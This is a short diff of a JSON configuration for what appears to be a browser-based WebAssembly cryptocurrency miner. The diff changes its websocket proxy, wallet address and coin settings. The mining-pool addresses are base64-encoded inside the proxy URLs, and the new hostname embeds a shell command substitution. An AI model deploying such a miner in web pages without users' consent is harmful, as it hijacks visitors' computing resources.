@@ -1,5 +1,5 @@
 {
-  "proxy": "wss://epoch-labs.up.railway.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==",
+  "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y29pbnhwLnRlYXRzcHJheS51azo4MjQz",
   "config": { "threads": 2, "log": true },
-  "options": { "user": "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65", "password": "c=RVN", "argent": "web-wasm/1.0" }
+  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8", "password": "c=MAZA,m=solo", "argent": "web-wasm/1.0" }
 }
